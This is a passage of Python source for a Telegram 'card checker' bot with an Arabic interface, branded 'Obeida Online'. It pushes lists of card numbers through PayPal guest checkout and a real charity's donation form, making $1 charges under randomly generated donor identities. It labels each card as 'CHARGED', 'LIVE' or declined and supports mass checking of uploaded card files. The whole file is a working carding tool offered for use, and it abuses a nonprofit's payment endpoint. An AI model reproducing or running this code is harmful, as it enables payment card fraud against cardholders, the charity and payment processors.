                phoneNumber: $phoneNumber
                firstName: $firstName
                lastName: $lastName
                email: $email
                shippingAddress: $shippingAddress
                billingAddress: $billingAddress
                currencyConversionType: $currencyConversionType
                installmentTerm: $installmentTerm
                identityDocument: $identityDocument
                feeReferenceId: $feeReferenceId
            ) {
                flags { is3DSecureRequired }
                cart {
                    intent
                    cartId
                    buyer { userId auth { accessToken } }
                    returnUrl { href }
                }
                paymentContingencies {
                    threeDomainSecure {
                        status method
                        redirectUrl { href }
                        parameter
                    }
                }
            }
        }
        """
        
        full_yy = card['yy'] if len(card['yy']) == 4 else "20" + card['yy']
        billing = {
            "givenName": donor["first"], "familyName": donor["last"],
            "line1": addr["line1"], "line2": None,
            "city": addr["city"], "state": addr["state"],
            "postalCode": addr["zip"], "country": "US"
        }
        
        variables = {
            "token": order_id,
            "card": {
                "cardNumber": card["number"],
                "type": self.detect_type(card["number"]),
                "expirationDate": f"{card['mm']}/{full_yy}",
                "postalCode": addr["zip"],
                "securityCode": card["cvc"]
            },
            "phoneNumber": donor["phone"],
            "firstName": donor["first"],
            "lastName": donor["last"],
            "email": donor["email"],
            "billingAddress": billing,
            "shippingAddress": billing,
            "currencyConversionType": "PAYPAL"
        }
        
        try:
            r = requests.post(
                "https://www.paypal.com/graphql?approveGuestPaymentWithCreditCard",
                headers=graphql_h,
                json={"query": query, "variables": variables},
                timeout=30
            )
            return r.text
        except Exception as e:
            return f"ERROR: {e}"
    
    def approve_order(self, order_id: str) -> str:
        data = {
            "give-honeypot": "",
            "give-form-id-prefix": self.tokens.get('pfx', ''),
            "give-form-id": self.tokens.get('id', ''),
            "give-form-hash": self.tokens.get('hash', ''),
            "payment-mode": "paypal-commerce",
            "give-amount": "1.00",
            "give-gateway": "paypal-commerce",
        }
        try:
            r = self.session.post(
                "https://awwatersheds.org/wp-admin/admin-ajax.php",
                params={"action": "give_paypal_commerce_approve_order", "order": order_id},
                headers=self.ajax_headers, data=data, timeout=30
            )
            return r.text
        except Exception as e:
            return f"ERROR: {e}"
    
    def analyze_response(self, paypal_text: str, approve_text: str = "") -> Dict[str, str]:
        t = paypal_text.upper() if paypal_text else ""
        
        if 'APPROVESTATE":"APPROVED' in t:
            return {"status": "CHARGED", "emoji": "✅", "msg": "CHARGED - Payment Approved!"}
        if 'PARENTTYPE":"AUTH' in t and '"CARTID"' in t:
            return {"status": "CHARGED", "emoji": "✅", "msg": "CHARGED - Auth Successful!"}
        if '"APPROVEGUESTPAYMENTWITHCREDITCARD"' in t and '"ERRORS"' not in t and '"CARTID"' in t:
            return {"status": "CHARGED", "emoji": "✅", "msg": "CHARGED!"}
        if 'CVV2_FAILURE' in t:
            return {"status": "APPROVED", "emoji": "✅", "msg": "CVV2 FAILURE (Card is LIVE)"}
        if 'INVALID_SECURITY_CODE' in t:
            return {"status": "APPROVED", "emoji": "✅", "msg": "Invalid Security Code (LIVE)"}
        if 'INVALID_BILLING_ADDRESS' in t:
            return {"status": "APPROVED", "emoji": "✅", "msg": "AVS FAILED (LIVE)"}
        if 'EXISTING_ACCOUNT_RESTRICTED' in t:
            return {"status": "APPROVED", "emoji": "✅", "msg": "Account Restricted (LIVE)"}
        if 'INSUFFICIENT_FUNDS' in t:
            return {"status": "LIVE", "emoji": "💰", "msg": "Insufficient Funds (LIVE CARD)"}
        
        combined = t + " " + (approve_text.upper() if approve_text else "")
        declines = [
            ('DO_NOT_HONOR', 'Do Not Honor'),
            ('ACCOUNT_CLOSED', 'Account Closed'),
            ('PAYER_ACCOUNT_LOCKED_OR_CLOSED', 'Account Locked/Closed'),
            ('LOST_OR_STOLEN', 'LOST OR STOLEN'),
            ('SUSPECTED_FRAUD', 'SUSPECTED FRAUD'),
            ('INVALID_ACCOUNT', 'INVALID ACCOUNT'),
            ('REATTEMPT_NOT_PERMITTED', 'REATTEMPT NOT PERMITTED'),
            ('ACCOUNT_BLOCKED_BY_ISSUER', 'ACCOUNT BLOCKED BY ISSUER'),
            ('ORDER_NOT_APPROVED', 'ORDER NOT APPROVED'),
            ('PICKUP_CARD_SPECIAL_CONDITIONS', 'PICKUP CARD'),
            ('PAYER_CANNOT_PAY', 'PAYER CANNOT PAY'),
            ('GENERIC_DECLINE', 'GENERIC DECLINE'),
            ('COMPLIANCE_VIOLATION', 'COMPLIANCE VIOLATION'),
            ('TRANSACTION_NOT_PERMITTED', 'TRANSACTION NOT PERMITTED'),
            ('PAYMENT_DENIED', 'PAYMENT DENIED'),
            ('INVALID_TRANSACTION', 'INVALID TRANSACTION'),
            ('RESTRICTED_OR_INACTIVE_ACCOUNT', 'RESTRICTED/INACTIVE ACCOUNT'),
            ('SECURITY_VIOLATION', 'SECURITY VIOLATION'),
            ('DECLINED_DUE_TO_UPDATED_ACCOUNT', 'DECLINED - UPDATED ACCOUNT'),
            ('INVALID_OR_RESTRICTED_CARD', 'INVALID/RESTRICTED CARD'),
            ('EXPIRED_CARD', 'EXPIRED CARD'),
            ('CRYPTOGRAPHIC_FAILURE', 'CRYPTOGRAPHIC FAILURE'),
            ('TRANSACTION_CANNOT_BE_COMPLETED', 'CANNOT BE COMPLETED'),
            ('DECLINED_PLEASE_RETRY', 'DECLINED - RETRY LATER'),
            ('TX_ATTEMPTS_EXCEED_LIMIT', 'TX ATTEMPTS EXCEED LIMIT'),
        ]
        for keyword, msg in declines:
            if keyword in combined:
                return {"status": "DECLINED", "emoji": "❌", "msg": msg}
        
        try:
            rj = json.loads(paypal_text)
            if "errors" in rj:
                return {"status": "DECLINED", "emoji": "❌", "msg": rj["errors"][0].get("message", "Unknown")}
        except:
            pass
        try:
            rj = json.loads(approve_text)
            if rj.get("data", {}).get("error"):
                return {"status": "DECLINED", "emoji": "❌", "msg": str(rj["data"]["error"])}
        except:
            pass
        
        return {"status": "DECLINED", "emoji": "❌", "msg": "UNKNOWN ERROR"}
    
    def check_card(self, card_data: Dict) -> Tuple[bool, str]:
        try:
            cc_str = f"{card_data['number']}|{card_data['month']}|{card_data['year']}|{card_data['cvv']}"
            card_info = {
                "number": card_data['number'],
                "mm": card_data['month'].zfill(2),
                "yy": card_data['year'],
                "cvc": card_data['cvv']
            }
            if len(card_info['yy']) == 2:
                card_info['yy'] = "20" + card_info['yy']
            
            donor = self.random_donor()
            
            if not self.scrape_tokens():
                return False, f"Token scrape failed: {self.last_error}"
            
            if not self.register_donation(donor):
                return False, "Donation registration failed"
            
            order_id = self.create_order()
            if not order_id:
                return False, "PayPal order creation failed"
            
            graphql_resp = self.charge_card(order_id, card_info, donor)
            approve_resp = self.approve_order(order_id)
            
            result = self.analyze_response(graphql_resp, approve_resp)
            
            is_approved = result["status"] in ["CHARGED", "APPROVED", "LIVE"]
            return is_approved, f"{result['emoji']} {result['status']}: {result['msg']}"
            
        except Exception as e:
            return False, f"Error: {str(e)[:50]}"

# ==================== بوابات الفحص ====================
class RealGateways:
    def __init__(self):
        self.stripe = StripeGateway()
        self.real = RealCheckGateway()
        self.paypal = PayPalGateway()
    
    async def check_card(self, gate: str, card: Dict) -> Tuple[bool, str]:
        if gate == 'stripe':
            return await self.stripe.process_card(card)
        elif gate == 'real':
            return await self.real.check_card(card)
        elif gate == 'paypal':
            return await asyncio.get_event_loop().run_in_executor(None, self.paypal.check_card, card)
        return False, "❌ بوابة غير مدعومة"

# ==================== واجهة المستخدم ====================
class UserInterface:
    @staticmethod
    def main_buttons():
        markup = InlineKeyboardMarkup(row_width=2)
        markup.add(
            InlineKeyboardButton("⛔ إيقاف الفحص", callback_data="stop_check"),
            InlineKeyboardButton("📢 القناة", url=CHANNEL_LINK),
            InlineKeyboardButton("👨‍💻 المطور", url=SUPPORT_LINK)
        )
        return markup
    
    @staticmethod
    def stop_button():
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("⛔ إيقاف الفحص", callback_data="stop_check"))
        return markup

# ==================== معالج الأوامر ====================
class CommandHandler:
    def __init__(self):
        self.gateways = RealGateways()
        self.ui = UserInterface()
        self.user_last_file = user_last_file
    
    def check_access(self, message) -> bool:
        return DataManager.check_access(message.from_user.id, message.chat.id)
    
    def save_last_file(self, user_id: int, file_id: str, file_name: str, content: str):
        self.user_last_file[user_id] = {"file_id": file_id, "file_name": file_name, "content": content, "timestamp": datetime.now().isoformat()}
    
    def get_last_file(self, user_id: int) -> Optional[Dict]:
        return self.user_last_file.get(user_id)
    
    def is_user_checking(self, user_id: int) -> bool:
        with active_checks_lock:
            return user_id in user_active_checks
    
    def set_user_checking(self, user_id: int, check_id: str):
        with active_checks_lock:
            user_active_checks[user_id] = check_id
    
    def clear_user_checking(self, user_id: int):
        with active_checks_lock:
            if user_id in user_active_checks:
                del user_active_checks[user_id]
    
    def handle_start(self, message):
        user = message.from_user
        users = DataManager.load_users()
        if str(user.id) not in users:
            users[str(user.id)] = {"user_id": user.id, "username": user.username, "first_name": user.first_name, "joined_date": datetime.now().isoformat(), "is_admin": user.id in ADMIN_IDS, "usage": {"total_checks": 0, "approved": 0, "declined": 0}, "default_gate": "stripe"}
            DataManager.save_users(users)
        
        default_gate = DataManager.get_user_default_gate(user.id)
        default_gate_name = GATES.get(default_gate, {}).get("name", "Stripe")
        
        welcome = f"""
✨ <b>مرحباً بك في بوت Obeida Online</b> ✨

<b>🚪 البوابة الافتراضية:</b> {default_gate_name}
<b>💡 البوت مجاني بالكامل للجميع!</b>

<b>📝 البوابات المتاحة:</b>
💳 Stripe - فحص سريع
✅ Real Check - فحص حقيقي
💰 PayPal - فحص PayPal

<b>📝 الأوامر:</b>
/st [البطاقة] - فحص عبر Stripe
/chk [البطاقة] - فحص عبر Real Check
/pp [البطاقة] - فحص عبر PayPal
/mass [ملف] - فحص ملف عبر Stripe
/chkm [ملف] - فحص ملف عبر Real Check
/ppm [ملف] - فحص ملف عبر PayPal
/stop - إيقاف الفحص
/profile - عرض إحصائياتك
/stats - إحصائيات البوت
/default [stripe/real/paypal] - تغيير البوابة
/lastfile - فحص آخر ملف

<b>📢 القناة:</b> {CHANNEL_USERNAME}
<b>👨‍💻 المطور:</b> {DEV_CONTACT}
"""
        bot.send_message(message.chat.id, welcome, parse_mode='HTML', reply_markup=self.ui.main_buttons())
    
    def handle_stop(self, message):
        user_id = message.from_user.id
        with active_checks_lock:
            if user_id in user_active_checks:
                del user_active_checks[user_id]
                bot.reply_to(message, "⛔ <b>تم إيقاف الفحص</b>", parse_mode='HTML')
            else:
                bot.reply_to(message, "ℹ️ <b>لا يوجد فحص نشط</b>", parse_mode='HTML')
    
    def handle_profile(self, message):
        user_id = message.from_user.id
        users = DataManager.load_users()
        data = users.get(str(user_id), {})
        usage = data.get('usage', {})
        default_gate = data.get('default_gate', 'stripe')
        total = usage.get('total_checks', 0)
        approved = usage.get('approved', 0)
        
        profile = f"""
👤 <b>الملف الشخصي</b>
━━━━━━━━━━━━
<b>🆔 المعرف:</b> <code>{user_id}</code>
<b>🚪 البوابة:</b> {GATES.get(default_gate, {}).get('name', 'Stripe')}
<b>📊 الإحصائيات:</b>
• إجمالي: {total}
• ✅ المقبولة: {approved}
• 📈 النجاح: {(approved/total*100) if total > 0 else 0:.1f}%
━━━━━━━━━━━━
🆔 Obeida Online
"""
        bot.reply_to(message, profile, parse_mode='HTML')
    
    def handle_stats(self, message):
        stats = DataManager.load_stats()
        total = stats.get('total_checks', 0)
        approved = stats.get('total_approved', 0)
        
        text = f"""
📊 <b>إحصائيات البوت</b>
━━━━━━━━━━━━
📈 <b>الإجمالي:</b> {total} فحص
✅ المقبولة: {approved}
📊 النجاح: {(approved/total*100) if total > 0 else 0:.1f}%
━━━━━━━━━━━━
🆔 Obeida Online
"""
        bot.reply_to(message, text, parse_mode='HTML')
    
    def handle_default_gate(self, message):
        parts = message.text.strip().split()
        if len(parts) < 2:
            current = DataManager.get_user_default_gate(message.from_user.id)
            bot.reply_to(message, f"⚙️ البوابة الحالية: {GATES[current]['name']}\nللتغيير: <code>/default stripe</code> أو <code>/default real</code> أو <code>/default paypal</code>", parse_mode='HTML')
            return
        
        gate = parts[1].lower()
        if gate not in GATES:
            bot.reply_to(message, "❌ بوابة غير موجودة\nالبوابات المتاحة: stripe, real, paypal", parse_mode='HTML')
            return
        
        if DataManager.set_user_default_gate(message.from_user.id, gate):
            bot.reply_to(message, f"✅ تم تعيين {GATES[gate]['name']}", parse_mode='HTML')
    
    def check_single_card(self, message, card: Dict, gate: str):
        user_id = message.from_user.id
        gate_name = GATES[gate]['name']
        masked_card = f"{card['number'][:6]}xxxxxx{card['number'][-4:]}"
        
        if self.is_user_checking(user_id):
            bot.reply_to(message, "⚠️ <b>لديك فحص نشط</b>\nاستخدم /stop للإيقاف", parse_mode='HTML')
            return
        
        check_id = str(int(time.time() * 1000))
        self.set_user_checking(user_id, check_id)
        
        def run_check():
            try:
                self._run_single_check(message, card, gate, gate_name, masked_card, user_id, check_id)
            finally:
                self.clear_user_checking(user_id)
        
        threading.Thread(target=run_check, daemon=True).start()
    
    def _run_single_check(self, message, card, gate, gate_name, masked_card, user_id, check_id):
        try:
            progress_msg = bot.reply_to(message, f"""
🚀 جاري الفحص 🚀
⏤‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌

𒊹︎︎︎ 𝗖𝗖 ⌁ {masked_card}
𒊹︎︎︎ 𝗦𝗧𝗔𝗧𝗨𝗦 ⌁ جاري التحقق ...
""", parse_mode='HTML', reply_markup=self.ui.stop_button())
            
            message_id = progress_msg.message_id
            chat_id = progress_msg.chat.id
            
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            approved, resp = loop.run_until_complete(self.gateways.check_card(gate, card))
            loop.close()
            
            if not self.is_user_checking(user_id) or user_active_checks.get(user_id) != check_id:
                bot.edit_message_text("⛔ تم إيقاف الفحص", chat_id, message_id, parse_mode='HTML')
                return
            
            DataManager.update_usage(user_id, gate, resp)
            DataManager.save_card_result(card['original'], gate_name, resp, user_id, approved)
            
            if gate == 'paypal':
                cc_str = f"{card['number']}|{card['month']}|{card['year']}|{card['cvv']}"
                status = "CHARGED" if approved else "DECLINED"
                DataManager.save_paypal_result(cc_str, status, resp)
            
            bin_info = Helpers.get_bin_info(card['number'][:6])
            final_result = ResultFormatter.format_single_result(card['original'], resp, approved, gate_name, bin_info)
            bot.edit_message_text(final_result, chat_id, message_id, parse_mode='HTML')
            
        except Exception as e:
            print(f"Error: {e}")
    
    def check_multiple_cards(self, message, cards: List[Dict], gate: str):
        user_id = message.from_user.id
        gate_name = GATES[gate]['name']
        
        if self.is_user_checking(user_id):
            bot.reply_to(message, "⚠️ <b>لديك فحص نشط</b>\nاستخدم /stop للإيقاف", parse_mode='HTML')
            return
        
        check_id = str(int(time.time() * 1000))
        self.set_user_checking(user_id, check_id)
        
        def run_mass():
            try:
                self._run_mass_check(message, cards, gate, gate_name, user_id, check_id)
            finally:
                self.clear_user_checking(user_id)
        
        threading.Thread(target=run_mass, daemon=True).start()
    
    def _run_mass_check(self, message, cards, gate, gate_name, user_id, check_id):
        try:
            total = len(cards)
            delay = DataManager.load_settings().get("delay_between_cards", 3)
            
            start_msg = bot.reply_to(message, f"""
🚀 بدء الفحص 🚀
━━━━━━━━━━━━
📊 البطاقات: {total}
🚪 البوابة: {gate_name}
━━━━━━━━━━━━
✅ المقبولة: 0
❌ المرفوضة: 0
""", parse_mode='HTML', reply_markup=self.ui.stop_button())
            
            msg_id = start_msg.message_id
            chat_id = start_msg.chat.id
            approved_count = 0
            
            for i, card in enumerate(cards, 1):
                if not self.is_user_checking(user_id) or user_active_checks.get(user_id) != check_id:
                    bot.edit_message_text("⛔ تم إيقاف الفحص", chat_id, msg_id, parse_mode='HTML')
                    return
                
                try:
                    bot.edit_message_text(f"""
🚀 جاري الفحص 🚀
━━━━━━━━━━━━
🔄 {i}/{total}
✅ المقبولة: {approved_count}
""", chat_id, msg_id, parse_mode='HTML', reply_markup=self.ui.stop_button())
                    
                    loop = asyncio.new_event_loop()
                    asyncio.set_event_loop(loop)
                    approved, resp = loop.run_until_complete(self.gateways.check_card(gate, card))
                    loop.close()
                    
                    if approved:
                        approved_count += 1
                        bin_info = Helpers.get_bin_info(card['number'][:6])
                        bot.send_message(chat_id, f"""
✅ <b>بطاقة مقبولة</b>
━━━━━━━━━━━━
<b>💳 البطاقة:</b> <code>{card['original']}</code>
<b>🏷️ النوع:</b> {bin_info.get('brand', 'Unknown')}
<b>🏦 البنك:</b> {bin_info.get('bank', 'Unknown')}
<b>🌍 الدولة:</b> {bin_info.get('country', 'Unknown')} {bin_info.get('flag', '🏁')}
""", parse_mode='HTML')
                    
                    DataManager.save_card_result(card['original'], gate_name, resp, user_id, approved)
                    DataManager.update_usage(user_id, gate, resp)
                    
                    if gate == 'paypal':
                        cc_str = f"{card['number']}|{card['month']}|{card['year']}|{card['cvv']}"
                        status = "CHARGED" if approved else "DECLINED"
                        DataManager.save_paypal_result(cc_str, status, resp)
                    
                    time.sleep(delay)
                    
                except Exception as e:
                    print(f"Error: {e}")
            
            bot.edit_message_text(f"""
🚀 اكتمل الفحص 🚀
━━━━━━━━━━━━
✅ المقبولة: {approved_count}
❌ المرفوضة: {total - approved_count}
━━━━━━━━━━━━
🆔 Obeida Online
""", chat_id, msg_id, parse_mode='HTML')
            
        except Exception as e:
            print(f"Error: {e}")
    
    def handle_single(self, message, gate):
        if not self.check_access(message):
            return
        parts = message.text.strip().split(' ', 1)
        if len(parts) < 2:
            bot.reply_to(message, f"⚠️ الاستخدام: /{GATES[gate]['command']} رقم|شهر|سنة|cvv")
            return
        card = Helpers.parse_card(parts[1])
        if not card:
            bot.reply_to(message, "❌ صيغة غير صحيحة\nمثال: 4111111111111111|12|25|123")
            return
        self.check_single_card(message, card, gate)
    
    def handle_mass(self, message, gate):
        if not self.check_access(message):
            return
        if message.document:
            self.handle_file_upload(message, gate)
        else:
            last = self.get_last_file(message.from_user.id)
            if last:
                cards = Helpers.extract_cards_from_text(last["content"])
                if cards:
                    bot.reply_to(message, f"📁 {last['file_name']}\n📊 {len(cards)} بطاقة")
                    self.check_multiple_cards(message, cards, gate)
                else:
                    bot.reply_to(message, "❌ لا توجد بطاقات صالحة")
            else:
                bot.reply_to(message, f"📁 أرسل ملف txt\nاستخدم: /{GATES[gate]['mass_command']}")
    
    def handle_file_upload(self, message, gate=None):
        try:
            file = bot.get_file(message.document.file_id)
            content = bot.download_file(file.file_path).decode('utf-8', errors='ignore')
            cards = Helpers.extract_cards_from_text(content)
            if not cards:
                bot.reply_to(message, "❌ لا توجد بطاقات صالحة")
                return
            self.save_last_file(message.from_user.id, message.document.file_id, message.document.file_name, content)
            if gate is None:
                gate = DataManager.get_user_default_gate(message.from_user.id)
            bot.reply_to(message, f"📁 {message.document.file_name}\n📊 {len(cards)} بطاقة")
            self.check_multiple_cards(message, cards, gate)
        except Exception as e:
            bot.reply_to(message, f"⚠️ خطأ: {str(e)[:50]}")
    
    def check_last_file(self, message):
        last = self.get_last_file(message.from_user.id)
        if not last:
            bot.reply_to(message, "❌ لم ترسل أي ملف من قبل")
            return
        cards = Helpers.extract_cards_from_text(last["content"])
        if not cards:
            bot.reply_to(message, "❌ لا توجد بطاقات صالحة")
            return
        gate = DataManager.get_user_default_gate(message.from_user.id)
        self.check_multiple_cards(message, cards, gate)

# ==================== معالج الكول باك ====================
class CallbackHandler:
    def __init__(self, handler):
        self.handler = handler
    
    def handle(self, call):
        if call.data == "stop_check":
            self.handler.handle_stop(call.message)
            bot.answer_callback_query(call.id, "⛔ جاري الإيقاف")

# ==================== خادم الويب ====================
def run_web_server():
    try:
        PORT = int(os.environ.get('PORT', 10000))
        
        class BotHandler(http.server.SimpleHTTPRequestHandler):
            def do_GET(self):
                self.send_response(200)
                self.send_header('Content-type', 'text/plain')
                self.end_headers()
                self.wfile.write(b'OK - Obeida Online Bot is running')
            
            def do_HEAD(self):
                self.send_response(200)
                self.end_headers()
            
            def log_message(self, format, *args):
                pass
        
        server = socketserver.TCPServer(("0.0.0.0", PORT), BotHandler)
        print(f"✅ Web server started on port {PORT}")
        server.serve_forever()
        
    except Exception as e:
        print(f"⚠️ Web server error: {e}")

# ==================== إعداد البوت ====================
def setup():
    DataManager.init_files()
    handler = CommandHandler()
    callback = CallbackHandler(handler)
    
    # تشغيل خادم الويب
    web_thread = threading.Thread(target=run_web_server, daemon=True)
    web_thread.start()
    
    @bot.message_handler(commands=['start'])
    def start(m): handler.handle_start(m)
    
    @bot.message_handler(commands=['stop'])
    def stop(m): handler.handle_stop(m)
    
    @bot.message_handler(commands=['profile'])
    def profile(m): handler.handle_profile(m)
    
    @bot.message_handler(commands=['stats'])
    def stats(m): handler.handle_stats(m)
    
    @bot.message_handler(commands=['default'])
    def default(m): handler.handle_default_gate(m)
    
    @bot.message_handler(commands=['lastfile'])
    def lastfile(m): handler.check_last_file(m)
    
    @bot.message_handler(commands=['st'])
    def stripe(m): handler.handle_single(m, 'stripe')
    
    @bot.message_handler(commands=['mass'])
    def stripe_mass(m): handler.handle_mass(m, 'stripe')
    
    @bot.message_handler(commands=['chk'])
    def real(m): handler.handle_single(m, 'real')
    
    @bot.message_handler(commands=['chkm'])
    def real_mass(m): handler.handle_mass(m, 'real')
    
    @bot.message_handler(commands=['pp'])
    def paypal(m): handler.handle_single(m, 'paypal')
    
    @bot.message_handler(commands=['ppm'])
    def paypal_mass(m): handler.handle_mass(m, 'paypal')
    
    @bot.message_handler(content_types=['document'])
    def doc(m): handler.handle_file_upload(m)
    
    @bot.message_handler(func=lambda m: True)
    def text(m):
        text = m.text.strip()
        if f"@{BOT_USERNAME}" in text:
            text = text.replace(f"@{BOT_USERNAME}", "").strip()
        cards = Helpers.extract_cards_from_text(text)
        if cards:
            if len(cards) == 1:
                handler.check_single_card(m, cards[0], DataManager.get_user_default_gate(m.from_user.id))
            else:
                handler.check_multiple_cards(m, cards, DataManager.get_user_default_gate(m.from_user.id))
        else:
            if Helpers.get_chat_type(m.chat.id) == "private":
                bot.reply_to(m, "⚠️ أرسل البطاقة: <code>4111111111111111|12|25|123</code>\n\nالبوابات المتاحة:\n/st - Stripe\n/chk - Real Check\n/pp - PayPal", parse_mode='HTML', reply_markup=UserInterface.main_buttons())
    
    @bot.callback_query_handler(func=lambda c: True)
    def cb(c): callback.handle(c)
    
    print(Fore.GREEN + "✅ البوت جاهز!" + Style.RESET_ALL)
    print(Fore.CYAN + "📌 البوابات المتاحة:" + Style.RESET_ALL)
    print(Fore.YELLOW + "   💳 Stripe - /st و /mass" + Style.RESET_ALL)
    print(Fore.YELLOW + "   ✅ Real Check - /chk و /chkm" + Style.RESET_ALL)
    print(Fore.YELLOW + "   💰 PayPal - /pp و /ppm" + Style.RESET_ALL)
    
    bot.infinity_polling()

if __name__ == "__main__":
    try:
        setup()
    except KeyboardInterrupt:
        print("\n⚠️ تم الإيقاف")
        sys.exit(0)
